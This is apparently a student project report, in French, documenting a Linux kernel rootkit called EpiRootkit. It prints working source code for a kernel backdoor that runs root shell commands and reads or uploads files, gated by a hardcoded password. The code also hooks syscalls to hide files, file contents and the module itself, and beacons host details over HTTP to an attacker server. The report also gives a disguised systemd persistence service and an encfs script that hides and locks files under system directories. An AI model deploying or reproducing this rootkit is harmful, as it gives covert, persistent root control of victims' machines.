# EpiRootkit - Machine Victime et Module Kernel

## Architecture du rootkit

EpiRootkit est un module kernel Linux developpe en langage C qui fonctionne entierement en espace noyau. Le rootkit implemente une architecture modulaire ou chaque composant gere des fonctionnalites specifiques tout en interagissant avec les autres.

### Structure modulaire et interactions

```
epirootkit/
├── main.c              # Serveur TCP kernel et orchestration generale
├── auth.c              # Cryptographie SHA-256 et verification mot de passe  
├── cache.c             # Gestion memoire kernel et structures de donnees
├── commandes.c         # Interface userspace et execution processus
├── dissimulation.c     # Hooks syscall et manipulation table appels systeme
├── notification.c      # Client HTTP kernel et communication reseau
├── epirootkit.h        # Definitions globales et constantes partagees
├── Makefile           # Build system et gestion dependances
├── encodage.sh         # script qui chffre et verouille les dossiers avec un mot de passe
└── install.sh         # Deploiement automatise et persistance systeme

```

### Architecture reseau kernel

Le rootkit implemente un serveur TCP complet directement dans l'espace kernel, utilisant l'API socket native du noyau Linux :

```c
// Initialisation du serveur dans main.c
static int __init epirootkit_init(void)
{
    // Creation socket kernel avec protocole TCP
    err = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sockfd);
    
    // Configuration adresse serveur sur toutes interfaces
    serveur_adresse.sin_family = AF_INET;
    serveur_adresse.sin_port = htons(PORT_CONTROLE);
    serveur_adresse.sin_addr.s_addr = INADDR_ANY;
    
    // Binding et ecoute sur port 8005
    err = kernel_bind(sockfd, (struct sockaddr *)&serveur_adresse, sizeof(serveur_adresse));
    err = kernel_listen(sockfd, 5);
    
    // Lancement thread kernel dedie pour gerer les connexions
    tache_serveur = kthread_run(creer_serveur, NULL, "kserveur");
}
```

**Gestion des connexions** : Le serveur utilise un thread kernel (`kthread`) qui accepte les connexions de maniere asynchrone. Chaque connexion est traitee dans le meme thread avec un protocole d'authentification obligatoire.

**Protocole de communication** : 
1. Envoi de `AUTH_REQUIRED` au client
2. Reception et verification du mot de passe via SHA-256
3. Etablissement de la session avec `AUTH_OK`
4. Traitement des commandes (`EXEC`, `LIRE`, `UPLOAD`)

### Systeme d'authentification cryptographique

L'authentification utilise l'API cryptographique du kernel Linux pour implementer un hachage SHA-256 securise :

```c
// Calcul SHA-256 dans auth.c utilisant l'API crypto kernel
int calculer_sha256(const char *data, char *hash_hex)
{
    struct crypto_shash *tfm;
    struct shash_desc *desc;
    unsigned char hash[32];
    
    // Allocation transformateur cryptographique SHA-256
    tfm = crypto_alloc_shash("sha256", 0, 0);
    
    // Creation descripteur avec espace pour contexte crypto
    desc = kmalloc(sizeof(struct shash_desc) + crypto_shash_descsize(tfm), GFP_KERNEL);
    desc->tfm = tfm;
    
    // Calcul hash en 3 etapes : init, update, final
    crypto_shash_init(desc);
    crypto_shash_update(desc, data, strlen(data));
    crypto_shash_final(desc, hash);
    
    // Conversion binaire vers hexadecimal
    for (i = 0; i < 32; i++) {
        sprintf(hash_hex + (i * 2), "%02x", hash[i]);
    }
}
```

**Securite du stockage** : Le mot de passe n'est jamais stocke en clair. Seul le hash SHA-256 est hardcode dans le binaire :
```c
static const char PASSWORD_HASH[] = "1e29e7045275a60d15275bf8e97b5a47644844f2bca62d70476e11ad0543e000";
```

### Execution de processus depuis l'espace kernel

Le rootkit utilise `call_usermodehelper` pour executer des commandes depuis l'espace kernel avec capture complete de sortie :

```c
// Execution dans commandes.c avec redirection I/O
char *executer_commande(char *cmd)
{
    char *temp_file = "/tmp/.cmd_output";
    char *argv[] = {"/bin/bash", "-c", cmd_with_bash, NULL};
    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
    
    // Construction commande avec redirection stdout/stderr
    snprintf(cmd_with_bash, TAILLE_BUFFER, "bash -c \"%s > /tmp/.cmd_output 2>&1\"", cmd);
    
    // Execution synchrone avec attente du processus
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    
    // Lecture fichier temporaire pour recuperer sortie
    f = filp_open(temp_file, O_RDONLY, 0);
    kernel_read(f, resultat, TAILLE_BUFFER - 1, &pos);
    filp_close(f, NULL);
}
```

**Privileges** : Les commandes s'executent avec les privileges kernel complets (equivalent root)  
**Capture de sortie** : Redirection vers fichier temporaire puis lecture via `kernel_read`
**Nettoyage** : Suppresion automatique du fichier temporaire apres lecture

### Gestion memoire kernel avancee

Le cache memoire utilise les listes chainees kernel pour une gestion efficace des fichiers :

```c
// Structure de donnees dans cache.c
struct fichier_cache {
    char nom[256];                    // Nom du fichier
    unsigned char *donnees;           // Donnees binaires
    size_t taille;                   // Taille en octets
    struct list_head liste;          // Noeud liste chainee kernel
    unsigned long crc;               // Checksum CRC32 pour integrite
};

// Liste globale protegee par spinlock
LIST_HEAD(fichiers_caches);
DEFINE_SPINLOCK(fichiers_lock);

// Ajout avec protection concurrence
int ajouter_fichier_cache(const char *nom, const unsigned char *donnees, size_t taille)
{
    struct fichier_cache *nouveau;
    
    // Allocation memoire kernel avec GFP_KERNEL
    nouveau = kmalloc(sizeof(struct fichier_cache), GFP_KERNEL);
    nouveau->donnees = kmalloc(taille, GFP_KERNEL);
    
    // Copie securisee des donnees
    memcpy(nouveau->donnees, donnees, taille);
    nouveau->crc = crc32(0, donnees, taille);
    
    // Insertion atomique dans liste
    spin_lock(&fichiers_lock);
    list_add(&nouveau->liste, &fichiers_caches);
    spin_unlock(&fichiers_lock);
}
```

**Protection concurrence** : Utilisation de spinlock pour l'acces concurrent aux structures
**Integrite des donnees** : Calcul CRC32 pour detecter la corruption memoire
**Gestion memoire** : Allocation/liberation explicite avec `kmalloc`/`kfree`

## Choix de la distribution et du kernel

### Distribution choisie : Ubuntu 20.04 LTS

La distribution Ubuntu 20.04 LTS a ete selectionnee pour les raisons techniques suivantes :

**Kernel version 5.4.x** : Cette version presente un equilibre optimal entre fonctionnalites modernes et accessibilite pour le developpement de rootkits. Les versions plus recentes introduisent des restrictions significatives qui compliquent l'implementation.

**Stabilite LTS** : Le support a long terme garantit une base stable pour le developpement et les tests.

**Documentation extensive** : L'ecosysteme Ubuntu offre une documentation complete pour le developpement kernel.

### Justification technique de la version kernel

Le choix du kernel 5.4.x plutot qu'une version plus recente est justifie par des limitations techniques introduites dans les versions ulterieures :

**Kernel 5.7+** : Suppression de `kallsyms_lookup_name` qui est cruciale pour localiser la table des appels systeme (`sys_call_table`) et implementer les hooks syscall neccessaires a la dissimulation.

**Kernel 5.8+** : Renforcement KASLR (randomisation de l'espace d'adressage kernel) et protection renforcee des pages de code kernel rendant plus difficile la localisation et modification des structures internes.

**Kernel 6.0+**: Modification de l'architecture des modules et evolution des API cryptographiques rendant obsoletes les techniques utilisees.

```c
// Code utilise dans dissimulation.c - non fonctionnel sur kernel 5.7+
static unsigned long *localiser_table_appels(void)
{
    unsigned long *table_trouvee;
    table_trouvee = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    return table_trouvee;
}
```

## Configuration de securite

### Securites conservees

Le systeme conserve volontairement plusieurs mecanismes de securite pour demontrer la robustesse du rootkit :

**SMEP/SMAP actives** : Les protections contre l'execution et l'acces supervisor/user restent actives.

**Modules signes** : Le systeme de signature des modules reste en place, necessitant une approche particuliere pour l'installation.

**SELinux/AppArmor** : Les systemes de controle d'acces obligatoire peuvent rester actives selon la configuration.

### Securites desactivees et justifications

**Secure Boot** : Desactive pour permettre le chargement de modules non signes. En production, le rootkit necessiterait un certificat de signature valide.

**Kernel lockdown** : Desactive pour permettre l'acces aux interfaces de debogage kernel necessaires au developpement.

**Module loading restrictions** : Les restrictions sur le chargement de modules depuis des sources non fiables sont relachees.

## Fonctionnalites implementees

### Communication reseau

Le rootkit implemente un serveur TCP complet en espace kernel utilisant l'API socket du noyau :

```c
// Creation du serveur dans main.c
err = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sockfd);
err = kernel_bind(sockfd, (struct sockaddr *)&serveur_adresse, sizeof(serveur_adresse));
err = kernel_listen(sockfd, 5);
```

**Port d'ecoute** : 8005 (configurable dans epirootkit.h)
**Protocole** : TCP avec authentification obligatoire
**Gestion des connexions** : Thread kernel dedie pour chaque session

### Systeme d'authentification

L'authentification utilise un hachage SHA-256 pour securiser l'acces :

```c
// Dans auth.c - Hash du mot de passe "crystal2025"
static const char PASSWORD_HASH[] = "1e29e7045275a60d15275bf8e97b5a47644844f2bca62d70476e11ad0543e000";
```

**Algorithme** : SHA-256 via l'API crypto kernel
**Stockage** : Hash uniquement, pas de mot de passe en clair
**Verification** : Comparaison de hash a chaque connexion

### Execution de commandes

Le systeme d'execution utilise `call_usermodehelper` pour lancer des processus depuis l'espace kernel :

```c
// Dans commandes.c
char *argv[] = {"/bin/bash", "-c", cmd_with_bash, NULL};
char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
```

**Capabilities** : Execution avec privileges root complets
**Capture de sortie** : Redirection vers fichiers temporaires
**Codes de retour** : Transmission du statut d'execution

### Commandes disponibles pour l'attaquant

L'interface attaquant propose uniquement les commandes suivantes:

- **EXEC** : Execution de commandes shell avec capture de sortie
- **LIRE** : Lecture de fichiers systeme distants  
- **UPLOAD** : Upload de fichiers vers la machine victime
- **FICHIERS** : Liste des fichiers stockes en cache memoire (non utilise)
- **EXTRAIT** : Extraction de fichiers du cache memoire (non utilise)

**Limitation importante** : Aucune commande pour controler la dissimulation. L'attaquant ne peut pas demander de cacher/reveler des fichiers specifiques depuis l'interface.

### Gestion des fichiers

#### Cache memoire kernel

Le rootkit maintient un cache en memoire kernel pour stocker des fichiers uploades :

```c
// Structure dans cache.h
struct fichier_cache {
    char nom[256];
    unsigned char *donnees;
    size_t taille;
    struct list_head liste;
    unsigned long crc;
};
```

**Persistance** : Les fichiers restent en memoire tant que le module est charge
**Integrite** : Verification CRC32 pour detecter la corruption
**Securite** : Inaccessible depuis l'espace utilisateur
**Chiffrement** : Communications protegees par tunnel SSH

**Limitation** : Cette fonctionnalite de cache n'est pas utilisee dans l'interface attaquant actuelle. Les fichiers uploades sont stockes directement sur le systeme de fichiers.

#### Upload et download

- **Upload** : Reception de donnees binaires via socket et stockage sur le systeme de fichiers
- **Download** : Lecture de fichiers systeme et transmission via socket  
- **Formats supportes** : Tous types de fichiers binaires ou texte
- **Chiffrement** : Protection des transferts via tunnel SSH automatique

### Hooks syscall et manipulation de la table des appels systeme

La dissimulation fonctionne par interception des appels systeme critiques via modification directe de la table des appels systeme :

```c
// Localisation et modification de sys_call_table dans dissimulation.c
static unsigned long *localiser_table_appels(void)
{
    unsigned long *table_trouvee;
    table_trouvee = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    return table_trouvee;
}

// Desactivation protection memoire pour modification
static void modifier_protection_memoire(int desactiver)
{
    unsigned long registre_controle;
    asm volatile("mov %%cr0, %0" : "=r" (registre_controle));
    
    if (desactiver) {
        registre_controle &= ~0x00010000;  // Clear bit WP (Write Protect)
    } else {
        registre_controle |= 0x00010000;   // Set bit WP
    }
    asm volatile("mov %0, %%cr0" : : "r" (registre_controle));
}

// Installation des hooks avec sauvegarde des originaux
int activer_dissimulation(void)
{
    camouflage.table_appels_systeme = localiser_table_appels();
    
    // Sauvegarde pointeurs originaux
    camouflage.listage_originale = (syscall_ptr_t)camouflage.table_appels_systeme[__NR_getdents64];
    camouflage.lecture_originale = (syscall_ptr_t)camouflage.table_appels_systeme[__NR_read];
    
    // Modification atomique de la table
    modifier_protection_memoire(1);
    camouflage.table_appels_systeme[__NR_getdents64] = (unsigned long)intercepter_lecture_repertoire;
    camouflage.table_appels_systeme[__NR_read] = (unsigned long)intercepter_lecture_fichier;
    modifier_protection_memoire(0);
}
```

**Technique de hook** : Modification directe de la table des appels systeme apres desactivation temporaire du bit Write Protect du registre CR0
**Syscalls interceptes** : `getdents64` pour masquer fichiers/repertoires, `read` pour filtrer contenu
**Reversibilite** : Sauvegarde des pointeurs originaux pour restauration possible

### Algorithme de filtrage des entrees de repertoire

L'interception de `getdents64` implemente un filtrage sophistique des entrees de repertoire :

```c
// Filtrage dans intercepter_lecture_repertoire
static asmlinkage long intercepter_lecture_repertoire(const struct pt_regs *registres)
{
    struct linux_dirent64 __user *listing_utilisateur;
    struct linux_dirent64 *tampon_noyau, *entree_courante, *entree_precedente;
    
    // Appel syscall original
    taille_retour = camouflage.listage_originale(registres);
    
    // Copie userspace vers kernel space
    tampon_noyau = kmalloc(taille_retour, GFP_KERNEL);
    copy_from_user(tampon_noyau, listing_utilisateur, taille_retour);
    
    // Parcours et filtrage des entrees
    decalage = 0;
    entree_precedente = NULL;
    
    while (decalage < taille_retour) {
        entree_courante = (struct linux_dirent64 *)((char *)tampon_noyau + decalage);
        
        // Test pattern de dissimulation
        if (verifier_nom_interdit(entree_courante->d_name)) {
            if (entree_precedente) {
                // Fusion avec entree precedente
                entree_precedente->d_reclen += entree_courante->d_reclen;
            } else {
                // Suppression premiere entree par decalage memoire
                taille_retour -= entree_courante->d_reclen;
                memmove(entree_courante, 
                       (char *)entree_courante + entree_courante->d_reclen,
                       taille_retour - decalage);
                continue;
            }
        } else {
            entree_precedente = entree_courante;
        }
        decalage += entree_courante->d_reclen;
    }
    
    // Retour vers userspace
    copy_to_user(listing_utilisateur, tampon_noyau, taille_retour);
    kfree(tampon_noyau);
}
```

**Algorithme de suppression** : Manipulation directe de la structure `linux_dirent64` pour supprimer les entrees correspondant aux patterns

### Filtrage de contenu de fichiers en temps reel

L'interception de `read` permet le filtrage ligne par ligne du contenu des fichiers :

```c
// Filtrage dans intercepter_lecture_fichier
static asmlinkage long intercepter_lecture_fichier(const struct pt_regs *registres)
{
    char *tampon_lecture, *tampon_filtre;
    char *debut_ligne, *fin_ligne;
    
    // Execution read original
    octets_lus = camouflage.lecture_originale(registres);
    
    // Verification si fichier cible (chemin contient "lignescache")
    fichier_ouvert = fget(descripteur_fichier);
    nom_chemin = d_path(&fichier_ouvert->f_path, chemin_fichier, PATH_MAX);
    if (!strstr(nom_chemin, "lignescache")) return octets_lus;
    
    // Copie et filtrage ligne par ligne
    tampon_lecture = kzalloc(octets_lus + 1, GFP_KERNEL);
    copy_from_user(tampon_lecture, tampon_utilisateur, octets_lus);
    
    tampon_filtre = kzalloc(octets_lus + 1, GFP_KERNEL);
    taille_filtree = 0;
    debut_ligne = tampon_lecture;
    
    while (debut_ligne < tampon_lecture + octets_lus) {
        fin_ligne = strchr(debut_ligne, '\n');
        if (!fin_ligne) fin_ligne = tampon_lecture + octets_lus;
        
        // Test pattern ligne interdite
        if (!verifier_ligne_interdite(debut_ligne)) {
            size_t longueur = fin_ligne - debut_ligne;
            if (fin_ligne < tampon_lecture + octets_lus) longueur++;
            
            // Copie ligne autorisee
            memcpy(tampon_filtre + taille_filtree, debut_ligne, longueur);
            taille_filtree += longueur;
        }
        debut_ligne = fin_ligne + 1;
    }
    
    // Remplacement contenu original
    copy_to_user(tampon_utilisateur, tampon_filtre, taille_filtree);
    return taille_filtree;
}
```

**Detection de fichiers cibles** : Analyse du chemin via `d_path` pour identifier les fichiers a filtrer
**Parsing ligne par ligne** : Utilisation de `strchr` pour decomposer le contenu en lignes
**Reconstruction** : Creation d'un nouveau buffer sans les lignes interdites

### Masquage du module dans l'espace kernel

Le rootkit implemente un masquage sophistique en supprimant ses traces des structures de donnees kernel :

```c
// Suppression des listes kernel dans dissimulation.c
void cacher_module(void)
{
    pr_info("epirootkit: Masquage module en cours\n");
    
    // Suppression de la liste des modules charges
    list_del(&THIS_MODULE->list);
    
    // Suppression de l'objet sysfs
    kobject_del(&THIS_MODULE->mkobj.kobj);
    
    pr_info("epirootkit: Module masque avec succes\n");
}
```

**Effet** : Le module devient invisible pour `/proc/modules`, `lsmod`, et l'arborescence `/sys/module/`
**Mecanisme** : Suppression des noeuds des listes chainees kernel sans desallocation memoire

### Systeme de notification HTTP kernel

Le rootkit implemente un client HTTP complet dans l'espace kernel pour communiquer avec la machine attaquant :

```c
// Client HTTP dans notification.c
int notifier_attaquant(void)
{
    struct socket *sock;
    struct sockaddr_in addr;
    struct msghdr msg;
    struct kvec iov;
    char *json_data, *http_request;
    
    // Creation socket client TCP
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    
    // Configuration adresse attaquant
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5000);
    ret = in4_pton(SERVEUR_ATTAQUANT, -1, ip_binary, -1, NULL);
    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));
    
    // Connexion TCP
    ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
    
    // Construction payload JSON avec informations systeme
    snprintf(json_data, 1024, 
             "{"
             "\"type\":\"ROOTKIT_ALERT\","
             "\"hostname\":\"%s\","
             "\"kernel\":\"%s %s\","
             "\"architecture\":\"%s\","
             "\"status\":\"INSTALLE ET ACTIF\","
             "\"port_controle\":%d,"
             "\"timestamp\":%lld"
             "}",
             utsname()->nodename, utsname()->sysname, utsname()->release,
             utsname()->machine, PORT_CONTROLE, ktime_get_real_seconds());
    
    // Construction requete HTTP POST
    snprintf(http_request, 2048,
             "POST /api/receive_notification HTTP/1.1\r\n"
             "Host: %s:5000\r\n"
             "Content-Type: application/json\r\n"
             "Content-Length: %zu\r\n"
             "Connection: close\r\n"
             "\r\n"
             "%s",
             SERVEUR_ATTAQUANT, strlen(json_data), json_data);
    
    // Envoi via kernel_sendmsg
    iov.iov_base = http_request;
    iov.iov_len = strlen(http_request);
    ret = kernel_sendmsg(sock, &msg, &iov, 1, strlen(http_request));
}
```

**Protocole** : HTTP/1.1 POST avec payload JSON
**Informations transmises** : Hostname, version kernel, architecture, timestamp
**Fonctionnement** : Systeme de retry avec 3 tentatives et delai de 2 secondes

### Mecanisme de persistance systeme

Le systeme de persistance utilise une approche multi-niveaux pour garantir le rechargement automatique :

```bash
# Service systemd genere par install.sh
cat > /etc/systemd/system/network-cache.service << EOF
[Unit]
Description=Network Cache Module
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe epirootkit
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

# Activation du service
systemctl enable network-cache.service

# Configuration modules-load
echo "epirootkit" > /etc/modules-load.d/network-cache.conf
```

**Double persistance** :
1. **Service systemd** : Execution controlee avec gestion des dependances
2. **modules-load.d** : Chargement automatique kernel au boot

**Nom discret** : `network-cache` pour eviter la suspicion (ressemble a un service systeme legitime)
**Ordre de demarrage** : Apres initialisation reseau (`After=network.target`)

### Patterns de dissimulation automatique

La dissimulation utilise des patterns predefinis pour identifier les elements a masquer :

```c
// Verification patterns fichiers dans dissimulation.c
static int verifier_nom_interdit(const char *nom_fichier)
{
    int compteur = 0;
    static const char *elements_a_dissimuler[] = {
        "fichiercache",           // Fichiers de test
        "network-cache.service",  // Service systemd
        "network-cache.conf",     // Configuration modules-load  
        "epirootkit",            // Module et fichiers associes
        NULL
    };
    
    while (elements_a_dissimuler[compteur]) {
        if (strstr(nom_fichier, elements_a_dissimuler[compteur]))
            return 1;  // Fichier a cacher
        compteur++;
    }
    return 0;  // Fichier visible
}

// Verification patterns lignes de fichiers
static int verifier_ligne_interdite(const char *contenu_ligne)
{
    int position = 0;
    static const char *texte_a_filtrer[] = {
        "cette ligne est cache",
        NULL
    };
    
    while (texte_a_filtrer[position]) {
        if (strstr(contenu_ligne, texte_a_filtrer[position]))
            return 1;  // Ligne a masquer
        position++;
    }
    return 0;  // Ligne visible
}
```

**Algorithme** : Recherche de sous-chaines avec `strstr` dans les noms et contenus
**Extensibilite** : Tableaux NULL-terminated permettant l'ajout facile de nouveaux patterns
**Performance** : Recherche lineaire optimisee pour un petit nombre de patterns

### Chiffrement des communications

Le rootkit utilise un tunnel SSH pour securiser les communications entre la machine victime et la machine attaquant. Cette approche presente plusieurs avantages :

**Tunnel SSH automatique** : Le script `TUNNELSSH.sh` etablit automatiquement un tunnel SSH chiffre :

```bash
# Creation du tunnel SSH avec forward de port
ssh -f -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
    -N -L "${LOCAL_PORT}:${found_ip}:${REMOTE_PORT}" "${USER_SSH}@${found_ip}"
```

**Avantages du tunnel SSH** :
- **Chiffrement robuste** : Utilise les algorithmes cryptographiques standards de SSH (AES, ChaCha20)
- **Authentification par cles** : Plus securise que l'authentification par mot de passe
- **Transparence applicative** : Le rootkit n'a pas besoin d'implementer le chiffrement
- **Detection reduite** : Le trafic apparait comme du SSH normal

**Configuration automatisee** :
- **Scan reseau** : Detection automatique des machines avec le port 8005 ouvert
- **Etablissement du tunnel** : Connexion SSH automatique sans intervention manuelle
- **Persistance** : Maintien du tunnel en cas de deconnexion

## Compilation et deploiement

### Makefile

Le Makefile gere la compilation du module kernel et les fonctionnalites de dissimulation :

```makefile
obj-m += epirootkit.o
epirootkit-objs := main.o auth.o cache.o commandes.o dissimulation.o notification.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
```

**Compilation** : Utilise l'infrastructure de compilation kernel standard
**Dependances** : Liens automatiques entre les differents modules
**Nettoyage** : Suppression complete des fichiers temporaires

### Installation automatisee

Le script `install.sh` automatise completement le deploiement :

1. **Compilation** du module kernel
2. **Installation** dans le repertoire des modules
3. **Configuration** de la persistance systemd
4. **Activation** des services automatiques
5. **Configuration** des mecanismes de dissimulation




-----------------------

# encodage.sh

## Description
Script de chiffrement de données utilisant EncFS pour créer un système de stockage sécurisé avec authentification par hash.

## Fonctionnalités
- **Vérification d'authenticité** : Validation par hash SHA-256 avant exécution
- **Chiffrement automatique** : Création d'un volume EncFS chiffré
- **Installation des dépendances** : Installation automatique d'encfs et expect si nécessaire
- **Copie sécurisée** : Transfert de tous les fichiers du répertoire courant vers le volume chiffré
- **Protection finale** : Application d'attributs immutables sur les dossiers

## Technologies utilisées

### EncFS - Le système de chiffrement
**Pourquoi EncFS ?**
- **Chiffrement transparent** : Les fichiers sont chiffrés automatiquement lors de l'écriture et déchiffrés à la lecture
- **Chiffrement au niveau fichier** : Chaque fichier est chiffré individuellement avec AES-256
- **Compatibilité** : Fonctionne sur la plupart des systèmes Linux sans modification du noyau
- **Performance** : Chiffrement/déchiffrement en temps réel sans impact majeur sur les performances

### Expect - L'automatisation des interactions
**Pourquoi Expect ?**
- **Automatisation sécurisée** : Permet de saisir automatiquement les mots de passe sans les exposer dans l'historique
- **Gestion des prompts** : Répond automatiquement aux questions d'EncFS (configuration, mots de passe)
- **Évite l'intervention manuelle** : Le script peut s'exécuter de manière autonome
- **Sécurité des credentials** : Les mots de passe ne sont jamais stockés en clair dans des fichiers

## Analyse détaillée du script

### 1. Config de base
```bash
#!/bin/bash
set -e
REPERTOIRE_COURANT=$(pwd)
DOSSIER_CHIFFRE="/etc/systemd/system/load_net"
DOSSIER_MONTE="/etc/systemd/system/networrk"
HASH_REFERENCE="dc08160901551a78c7e63598654103d8e808579a175203161be05933f0d8376a"
```
**Ce que ca fait :**
- `#!/bin/bash` : dit au systeme d'utiliser bash pour executer
- `set -e` : si une commande plante, tout s'arrete (securité)
- `REPERTOIRE_COURANT=$(pwd)` : retient ou on est actuellement
- `DOSSIER_CHIFFRE` : la ou on stocke les fichier cryptés (nom bizarre exprès)
- `DOSSIER_MONTE` : la ou on peut voir les fichier décryptés (faute de frappe volontaire pour camoufler)
- `HASH_REFERENCE` : une sorte de "mot de passe" en SHA-256 pour verifier qu'on a le droit

### 2. Generation du password securisé
```bash
generer_mot_de_passe() {
    if [ "$HASH_REFERENCE" = "dc08160901551a78c7e63598654103d8e808579a175203161be05933f0d8376a" ]; then
        MOT_DE_PASSE=$(printf "\x63\x72\x79\x73\x74\x61\x6c\x32")
        return 0
    else
        return 1
    fi
}
```
**Ce que ca fait :**
- Verifie si le hash correspond (comme un mot de passe principal)
- Si c'est bon, genere le vrais mot de passe "crystal2" mais écrit en hexadecimal pour pas que ca se voit
- `\x63\x72\x79\x73\x74\x61\x6c\x32` = "crystal2" en code
- return 0 = ok, return 1 = pas ok

### 3. Install des outils necessaires
```bash
verifier_dependances() {
    if ! command -v encfs &> /dev/null; then
        sudo apt update && sudo apt install -y encfs
    fi
    if ! command -v expect &> /dev/null; then
        sudo apt install -y expect
    fi
}
```
**Ce que ca fait :**
- `command -v encfs` : regarde si encfs est installé
- `&> /dev/null` : cache les message d'erreur
- Si encfs manque, fait `apt update` puis `apt install encfs`
- Pareil pour expect (sert a automatiser les reponses)
- `-y` : repond oui automatiquement aux questions d'installation

### 4. Creation du systeme de fichier crypté
```bash
creer_encfs() {
    [ -d "$DOSSIER_MONTE" ] && sudo fusermount -u "$DOSSIER_MONTE" 2>/dev/null || true
    sudo mkdir -p "$DOSSIER_CHIFFRE"
    sudo mkdir -p "$DOSSIER_MONTE"
    sudo chown root:root "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
    sudo chmod 755 "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
    expect << EOF
spawn encfs "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
expect "?>"
send "\r"
expect "New Encfs Password:"
send "$MOT_DE_PASSE\r"
expect "Verify Encfs Password:"
send "$MOT_DE_PASSE\r"
expect eof
EOF
}
```
**Ce que ca fait :**
- `[ -d "$DOSSIER_MONTE" ]` : verifie si le dossier existe deja
- `fusermount -u` : demonte le volume si il était deja monté
- `mkdir -p` : cree les dossier (avec les parents si besoin)
- `chown root:root` : met root comme proprietaire (plus securisé)
- `chmod 755` : donne les permission (lecture/ecriture pour root, lecture pour les autres)
- `expect` : automatise les reponse a encfs
  - `spawn` : lance la commande encfs
  - `expect "?>"` : attend que encfs demande la config
  - `send "\r"` : appuie sur entrée (config par defaut)
  - Puis repond au mot de passe automatiquement

### 5. Montage pour acceder aux fichier
```bash
monter_encfs() {
    sudo mkdir -p "$DOSSIER_MONTE"
    sudo chown $USER:$USER "$DOSSIER_MONTE"
    sudo chmod 755 "$DOSSIER_MONTE"
    expect << EOF
spawn encfs "$DOSSIER_CHIFFRE" "$DOSSIER_MONTE"
expect "EncFS Password:"
send "$MOT_DE_PASSE\r"
expect eof
EOF
}
```
**Ce que ca fait :**
- Prepare le point de montage
- `chown $USER:$USER` : donne la propriété a l'utilisateur actuel
- Monte le volume crypté en donnant le mot de passe automatiquement
- Une fois monté, on peut lire/ecrire dans le dossier comme si c'était normal

### 6. Copie de tout les fichier
```bash
copier_donnees() {
    if [ -z "$(ls -A "$REPERTOIRE_COURANT" 2>/dev/null)" ]; then
        return
    fi
    cp -r "$REPERTOIRE_COURANT"/.[!.]* "$DOSSIER_MONTE/" 2>/dev/null || true
    cp -r "$REPERTOIRE_COURANT"/* "$DOSSIER_MONTE/" 2>/dev/null || true
}
```
**Ce que ca fait :**
- `ls -A` : liste tous les fichier (même cachés)
- `[ -z "..." ]` : verifie si c'est vide
- Si ya rien, fait rien et sort
- `cp -r` : copie récursivement (avec sous-dossier)
- `.[!.]*` : tous les fichier cachés (qui commence par . mais pas .. ou .)
- `/*` : tous les fichier normaux
- `2>/dev/null || true` : ignore les erreur (certains fichier peuvent pas etre copiés)

### 7. Verrouillage final
```bash
finaliser_chiffrement() {
    fusermount -u "$DOSSIER_MONTE"
    echo "CHIFFREMENT TERMINER"
    sudo chattr +i "$DOSSIER_CHIFFRE"
    sudo chattr +i "$DOSSIER_MONTE"
}
```
**Ce que ca fait :**
- `fusermount -u` : demonte le volume (les fichier redevienne inaccessible)
- `echo` : affiche un message
- `chattr +i` : met l'attribut "immutable" = impossible a supprimer même en root
- Maintenant les dossier sont verrouillés et les fichier cryptés

## Execution du script
```bash
if ! generer_mot_de_passe; then
    echo "Mauvais mauvais"
    exit 1
fi
verifier_dependances
creer_encfs
copier_donnees
finaliser_chiffrement
```
**Ce que ca fait :**
- Lance `generer_mot_de_passe()`, si ca marche pas, affiche "Mauvais mauvais" et arrete
- Sinon fait toute les etapes dans l'ordre
- A la fin, tout est crypté et verrouillé

## Garanties de sécurité

### Protection des données
1. **Chiffrement AES-256** : Meme la NSA galere dessus
2. **Chiffrement par fichier** : Si un fichier est cracké, les autre sont safe
3. **Clés uniques** : Chaque fichier a sa propre clé generée

### Protection d'accès  
1. **Hash d'authentification** : Faut connaitre le bon hash pour lancer le script
2. **Noms de dossier camouflés** : Cachés dans les fichier système, personne regarde la
3. **Attributs immutable** : Meme root peut pas les virer

### Protection contre les attaque
1. **Password en hexa** : Pas visible dans le code
2. **Auto-démontage** : Les fichier sont accessible que pendant l'execution
3. **Permission restrictive** : Seul root peut toucher
4. **Intégrité du script** : Le hash detecte si quelqu'un a modifié le script


## Prérequis
- Droits sudo (faut etre admin)
- Linux avec FUSE
- Internet pour installer les dependance

## Niveau de sécurité
- **Confidentialité** : AES-256, personne peut lire sans le password
- **Intégrité** : Hash SHA-256 pour detecter les modification
- **Accès controlé** : Seul ceux qui ont le hash peuvent utiliser
- **Furtivité** : Caché dans l'arborescence, personne soupçonne rien

**Note importante :** Ce système est tres securisé mais faut pas perdre le hash de reference ni oublier le mot de passe, sinon c'est mort pour recuperer les fichier !

